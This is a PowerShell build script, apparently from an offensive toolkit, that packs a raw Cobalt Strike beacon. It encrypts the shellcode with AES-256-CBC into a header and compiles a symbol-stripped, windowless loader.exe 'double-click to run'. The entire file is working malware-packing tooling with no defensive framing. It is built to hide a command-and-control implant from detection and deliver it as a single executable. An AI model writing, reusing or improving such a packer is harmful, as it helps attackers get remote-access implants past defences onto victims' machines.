# ============================================================
#  build.ps1 - packer: raw beacon -> loader.exe (AES-256-CBC)
#  Usage : powershell -ExecutionPolicy Bypass -File build.ps1 [-Beacon <path>]
#  Sample: powershell -ExecutionPolicy Bypass -File build.ps1 -Beacon D:\new_beacon.bin
#  (All-ASCII on purpose: compatible with Windows PowerShell 5.1)
# ============================================================
param(
    [string]$Beacon = "beacon_x64.bin",   # your fresh CS raw x64 beacon
    [string]$Gcc     = "",                # full path to gcc.exe; empty = use PATH
    [string]$EncPy   = ""                 # encrypt_aes.py; empty = same dir
)

$ErrorActionPreference = "Stop"
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
Set-Location $here

if (-not $EncPy) { $EncPy = Join-Path $here "encrypt_aes.py" }
if (-not $Gcc)   { $Gcc = (Get-Command gcc -ErrorAction SilentlyContinue).Source }
if (-not $Gcc)   { throw "gcc not found: install w64devkit and add bin to PATH, or pass -Gcc" }
if (-not (Test-Path $Beacon)) { throw "beacon file not found: $Beacon" }
if (-not (Test-Path $EncPy))  { throw "encrypt_aes.py not found: $EncPy" }

$env:PATH = (Split-Path $Gcc) + ";" + $env:PATH

# 1. AES-256-CBC encrypt -> payload_v8.h (KEY/IV live in encrypt_aes.py)
python $EncPy
if ($LASTEXITCODE -ne 0) { throw "encrypt step failed" }

# 2. compile (GUI subsystem, strip symbols)
gcc -mwindows -O2 -o loader.exe loader_v8.c -s
if ($LASTEXITCODE -ne 0) { throw "compile failed" }

Write-Host ""
Write-Host "[OK] loader.exe built: $((Get-Item loader.exe).Length) bytes"
Write-Host "    beacon : $Beacon"
Write-Host "    cipher : AES-256-CBC (KEY/IV in encrypt_aes.py)"
Write-Host "    deploy : single file loader.exe, double-click to run"
